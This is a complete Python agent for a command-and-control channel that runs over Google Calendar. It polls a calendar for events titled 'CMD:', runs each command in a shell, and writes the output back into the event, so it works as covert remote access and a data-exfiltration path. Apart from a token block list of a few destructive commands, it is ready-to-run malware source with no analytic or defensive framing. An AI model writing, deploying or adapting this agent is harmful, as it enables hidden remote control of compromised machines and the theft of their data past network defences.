#!/usr/bin/env python3

import os
import sys
import json
import subprocess
import time
import argparse
from datetime import datetime, timedelta
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build

SCOPES = ['https://www.googleapis.com/auth/calendar']
TOKEN_FILE = 'token_agent.json'
CREDENTIALS_FILE = 'c2cal.json'
POLL_INTERVAL = 30  

class C2Agent:
    def __init__(self, calendar_name="C2-Operations", agent_id="default"):
        self.agent_id = agent_id
        self.service = self._authenticate()
        self.calendar_id = self._get_calendar_id(calendar_name)
        print(f"[+] Agent {agent_id} initialized. Waiting for commands...")
        
    def _authenticate(self):
        """Same auth as controller"""
        creds = None
        if os.path.exists(TOKEN_FILE):
            creds = Credentials.from_authorized_user_file(TOKEN_FILE, SCOPES)
        
        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
                creds = flow.run_local_server(port=0)
            
            with open(TOKEN_FILE, 'w') as token:
                token.write(creds.to_json())
        
        return build('calendar', 'v3', credentials=creds)
    
    def _get_calendar_id(self, name):
        """Find the C2 calendar by name"""
        calendars = self.service.calendarList().list().execute()
        for cal in calendars.get('items', []):
            if cal.get('summary') == name:
                return cal.get('id')
        raise Exception(f"Calendar '{name}' not found. Run controller first.")
    
    def _execute_command(self, command):
        """Execute system command and return output"""
        try:
            dangerous = ['rm -rf', 'format', 'shutdown', 'reboot']
            for d in dangerous:
                if d in command.lower():
                    return f"[BLOCKED] Dangerous command: {d}"
            
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            output = result.stdout if result.stdout else result.stderr
            return output[:5000]  
        except subprocess.TimeoutExpired:
            return "[ERROR] Command timed out"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def poll_commands(self):
        """Main loop: check for new commands"""
        while True:
            try:
                now = datetime.utcnow().isoformat() + 'Z'
                events = self.service.events().list(
                    calendarId=self.calendar_id,
                    timeMin=now,
                    maxResults=10,
                    singleEvents=True,
                    orderBy='startTime'
                ).execute()
                
                for event in events.get('items', []):
                    desc = event.get('description', '')
                    if f'Agent: {self.agent_id}' in desc and 'Status: COMPLETED' not in desc:
                        summary = event.get('summary', '')
                        if summary.startswith('CMD: '):
                            command = summary.replace('CMD: ', '').strip()
                            print(f"[+] Executing: {command}")                            
                            output = self._execute_command(command)
                            updated_desc = desc.replace('Status: PENDING', 'Status: COMPLETED')
                            updated_desc += f'\nOutput: {output}'                            
                            event['description'] = updated_desc
                            event['colorId'] = '3'                              
                            self.service.events().update(
                                calendarId=self.calendar_id,
                                eventId=event['id'],
                                body=event
                            ).execute()                        
                            print(f"[+] Command completed. Output saved.")
                time.sleep(POLL_INTERVAL)
                
            except KeyboardInterrupt:
                print("\n[!] Agent stopped.")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(POLL_INTERVAL)

def main():
    parser = argparse.ArgumentParser(description='Google Calendar C2 Agent')
    parser.add_argument('--calendar', default='C2-Operations', help='Calendar name')
    parser.add_argument('--agent', default='default', help='Agent identifier')
    parser.add_argument('--once', action='store_true', help='Run once then exit')
    
    args = parser.parse_args()
    agent = C2Agent(args.calendar, args.agent)
    
    if args.once:
        agent.poll_commands()
    else:
        try:
            agent.poll_commands()
        except KeyboardInterrupt:
            print("\n[!] Agent terminated.")

if __name__ == "__main__":
    main()
